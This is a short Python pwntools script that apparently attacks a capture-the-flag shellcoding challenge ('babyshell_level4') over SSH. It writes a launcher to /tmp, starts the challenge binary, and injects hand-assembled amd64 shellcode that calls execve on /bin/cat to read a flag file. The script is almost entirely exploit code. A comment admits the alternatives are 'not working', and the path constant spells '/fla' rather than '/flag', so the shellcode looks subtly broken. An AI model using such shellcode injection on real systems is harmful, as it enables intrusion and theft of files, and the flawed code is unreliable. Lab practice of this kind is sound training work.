#!/usr/bin/env python3
from pwn import *
import re

context.arch = 'amd64'


def btos(n):
    return n.decode('UTF-8')
    
s = ssh(host="pwn")
f = SSHPath('/tmp/my_script.py', ssh=s)
f.touch()
f.write_text('import subprocess; subprocess.run("/challenge/babyshell_level4")')
p = s.process(['python', '/tmp/my_script.py'])
r = p.recvuntil(b"Reading 0x1000 bytes from stdin.")
print(r.decode())

shellcode="""
push 0x7273752f
push 0x6e69622f
mov dword ptr [rsp+4], 0x7461632f  # b'/bin/cat'
push rsp
pop rdi
push 0x616c662f
push rsp
pop rsi
push 0
push rsi
push rdi
push rsp
pop rsi
push 0
pop rdx
push 0x3b
pop rax
syscall
"""
# both not working, how to prevent 48 opcode in 64 bit mode? 
#shellcode=pwnlib.shellcraft.i386.linux.cat("/flag")
#shellcode=pwnlib.shellcraft.amd64.linux.sh()
shellcode=(asm(shellcode))


print('1', disasm(shellcode))
ELF.from_bytes(shellcode).debug()


shellcode=bytes(shellcode)
p.send(shellcode)
print(p.recvall().decode("UTF-8"))